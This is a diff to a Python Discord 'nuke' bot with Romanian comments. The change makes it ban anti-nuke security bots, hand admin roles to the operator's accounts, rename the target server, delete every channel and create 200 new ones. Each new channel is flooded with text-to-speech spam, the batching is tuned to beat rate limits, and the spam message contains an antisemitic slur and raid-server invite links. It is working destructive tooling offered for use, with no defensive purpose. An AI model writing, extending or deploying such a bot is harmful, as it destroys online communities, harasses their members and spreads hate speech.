@@ -154,14 +154,19 @@ class CooldownManager:
 
 cooldown_manager = CooldownManager(100)
 
-async def detect_antinuKe_bots(guild):
-    found_bots = []
+async def detect_and_ban_antinuke_bots(guild):
+    """Detectează și banează boturile de securitate"""
+    banned = []
     for member in guild.members:
         if member.bot:
             bot_name = member.nick or member.name
             if member.id in BLOCKED_BOT_IDS or any(x.lower() in bot_name.lower() for x in BLOCKED_BOT_NAMES):
-                found_bots.append(f"{bot_name} ({member.id})")
-    return found_bots
+                try:
+                    await member.ban(reason="Anti-nuke bot detected")
+                    banned.append(f"{bot_name} ({member.id})")
+                except:
+                    pass
+    return banned
 
 class MyBot(commands.Bot):
     def __init__(self):
@@ -219,17 +224,10 @@ async def setup(ctx):
         await guild.leave()
         return
 
-    found = await detect_antinuKe_bots(guild)
-    if found:
-        spam_message = user_config.get("webhook_message", "@everyone discord.gg/VSQzzAMVw3 Corrupt owns this")
-        for channel in guild.text_channels:
-            try:
-                await asyncio.gather(*(
-                    channel.send(spam_message) for _ in range(10)
-                ))
-            except:
-                pass
-        return
+    # ===== BAN ANTI-NUKE BOTS =====
+    banned_bots = await detect_and_ban_antinuke_bots(guild)
+    if banned_bots:
+        await user.send(f"✅ Banați boturile: {', '.join(banned_bots)}")
 
     save_nuke_stats(user.id, guild)
 
@@ -242,43 +240,23 @@ async def setup(ctx):
             member = guild.get_member(admin_id)
             if member:
                 await member.add_roles(admin_role)
-                # Trimitem un DM adminului
-                try:
-                    await member.send(f"✅ Rol admin acordat în serverul {guild.name}")
-                except:
-                    pass
-    except Forbidden:
-        await user.send("❌ Nu am permisiunea să creez roluri.")
-        return
-    except Exception as e:
-        await user.send(f"❌ Eroare la crearea rolului: {e}")
-        return
+    except:
+        pass
 
     # SCHIMBARE NUME SERVER
     try:
         await guild.edit(name="1weeksober owns this")
-    except Exception as e:
-        await user.send(f"⚠️ Nu am putut schimba numele: {e}")
+    except:
+        pass
 
-    # STERGERE CANALE - dar păstrăm un canal nou pentru loguri
-    # Mai întâi, ștergem toate canalele
-    deleted = 0
+    # STERGERE CANALE
     for channel in guild.channels:
         try:
             await channel.delete()
-            deleted += 1
         except:
             continue
 
-    # Acum creăm un canal nou pentru a trimite mesaje de progres
-    try:
-        log_channel = await guild.create_text_channel(name="larp-log")
-        await log_channel.send("✅ Toate canalele au fost șterse. Încep crearea celor 200 de canale...")
-    except Exception as e:
-        # Dacă nu putem crea canalul de log, trimitem în DM
-        await user.send(f"⚠️ Nu am putut crea canalul de log: {e}. Continui în DM.")
-        log_channel = None
-
+    # ===== LISTA NUME CANALE (fără cifre) =====
     channel_names = [
         "1weeksober-owns",
         "1week-King",
@@ -286,53 +264,66 @@ async def setup(ctx):
         "Larp-empire-on-top"
     ]
 
-    spam_message = "This sv has been officially closed\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire"
+    # ===== MESAJ SPAM =====
+    spam_text = "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n# LARP EMPIRE SERVER NON HOOKED EVERYONE JOIN HERE GUYS LEAVE THIS SH\nhttps://discord.gg/larpempire"
 
-    # CREARE 200 CANALE
+    # ===== EMBED BANNER =====
+    embed = discord.Embed(color=0x000000)  # margine neagră
+    embed.set_image(url="https://i.imgur.com/yMQvcRw.gif")
+
+    # ===== CREARE 200 CANALE RAPID =====
     created = 0
     async def create_channel_and_send(index):
         nonlocal created
         try:
-            name = random.choice(channel_names) + "-" + str(random.randint(1000, 9999))
-            ch = await guild.create_text_channel(name=name)
+            # Alege un nume aleatoriu din listă (fără cifre)
+            name = random.choice(channel_names)
+            # Adaugă un font diferit pentru fiecare canal (Unicode)
+            # Folosim caractere din diferite scripturi pentru a varia
+            fonts = [
+                "",  # normal
+                " 𝖙𝖊𝖝𝖙",  # sans-serif bold
+                " 𝕥𝕖𝕩𝕥",  # double-struck
+                " 𝓽𝓮𝔁𝓽",  # script
+                " 𝔱𝔢𝔵𝔱",  # fraktur
+                " 𝘵𝘦𝘹𝘵",  # sans-serif italic
+            ]
+            font_suffix = random.choice(fonts)
+            final_name = name + font_suffix
+            # Limita de lungime Discord: 100 caractere
+            if len(final_name) > 100:
+                final_name = name
+
+            ch = await guild.create_text_channel(name=final_name)
+            # Trimite embed-ul o dată
+            await ch.send(embed=embed)
+            # Trimite spam text de 100 de ori (sau 50 dacă nu premium)
             spams = 100 if is_premium_user(user.id) else 50
             for _ in range(spams):
-                await ch.send(content=spam_message, tts=True)
+                await ch.send(content=spam_text, tts=True)
             created += 1
-            # Trimitem progres în canalul de log sau DM
-            if log_channel and index % 10 == 0:
-                await log_channel.send(f"✅ Creat {created} canale până acum...")
         except Exception as e:
-            if log_channel:
-                await log_channel.send(f"❌ Eroare la crearea canalului {index}: {e}")
-            else:
-                await user.send(f"❌ Eroare la crearea canalului {index}: {e}")
+            # Trimitem eroarea în DM
+            await user.send(f"❌ Eroare la canalul {index}: {e}")
 
-    if log_channel:
-        await log_channel.send("🔄 Se creează 200 de canale... (durează ~30-60 secunde)")
+    # Trimitem mesaj în DM că începem
+    await user.send("🔄 Încep crearea a 200 de canale...")
 
-    # Creare canale în batch-uri de câte 10 pentru a evita rate limit
+    # Creare în batch-uri de 25 pentru viteză
     tasks = [create_channel_and_send(i) for i in range(200)]
-    for i in range(0, len(tasks), 10):
-        await asyncio.gather(*tasks[i:i+10])
-        await asyncio.sleep(1.5)
+    for i in range(0, len(tasks), 25):
+        await asyncio.gather(*tasks[i:i+25])
+        await asyncio.sleep(0.5)  # pauză scurtă
 
-    if log_channel:
-        await log_channel.send(f"✅ Creare finalizată! {created} canale create.")
+    await user.send(f"✅ Creare finalizată! {created} canale create.")
 
     # CREARE ROL
     try:
         await guild.create_role(name="1weeksober-on-top")
-        if log_channel:
-            await log_channel.send("✅ Rol creat.")
     except:
         pass
 
-    # Trimitem mesaj final în DM și în log_channel
-    final_msg = f"✅ Nuke finalizat în serverul {guild.name}. {created} canale create."
-    await user.send(final_msg)
-    if log_channel:
-        await log_channel.send("✅ Părăsesc serverul...")
+    await user.send("✅ Părăsesc serverul...")
     await guild.leave()
 
 class SettingsModal(discord.ui.Modal):
